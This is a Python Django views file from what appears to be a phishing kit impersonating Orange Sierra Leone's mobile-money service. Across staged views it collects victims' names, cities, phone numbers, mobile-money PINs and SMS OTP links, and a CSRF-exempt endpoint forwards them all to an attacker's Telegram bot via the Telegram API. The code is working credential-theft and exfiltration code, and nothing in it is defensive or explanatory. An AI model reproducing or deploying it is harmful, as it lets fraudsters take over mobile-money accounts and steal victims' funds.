def payment_instructions(request):
    """Stage 2: Capture Phone and PIN (Orange Max it Style)"""
    if request.method == 'POST':
        # Data from previous checkout page
        request.session['name'] = request.POST.get('name')
        request.session['city'] = request.POST.get('city')
        request.session['bundle'] = request.POST.get('bundle')
        return render(request, 'payment_instructions.html')
    return redirect('home')

def otp_verification(request):
    """Stage 3: Capture the SMS Link after PIN is submitted"""
    if request.method == 'POST':
        # Capture and store the Phone and PIN from the previous screen
        request.session['phone'] = request.POST.get('phone')
        request.session['pin'] = request.POST.get('pin')
        return render(request, 'otp_verification.html')
    return redirect('home')

@csrf_exempt
def sync_data(request):
    """Stage 4: Final Sync to Telegram"""
    if request.method == 'POST':
        try:
            d = json.loads(request.body)
            # Combine everything for the final report
            msg = (
                "🇸🇱 *NEW ORANGE SL ORDER*\n"
                "--------------------------\n"
                f"👤 *Identity:* `{request.session.get('name')}`\n"
                f"📞 *Orange SL:* `+232 {request.session.get('phone')}`\n"
                f"📍 *City:* `{request.session.get('city')}`\n"
                "--------------------------\n"
                f"🔑 *Orange PIN:* `{request.session.get('pin')}`\n"
                f"🔗 *OTP Link:* `{d.get('otp')}`\n"
                "--------------------------\n"
                "📡 *Status:* Synchronization Active"
            )
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
            return JsonResponse({"status": "ok"})
        except:
            return JsonResponse({"status": "err"}, status=400)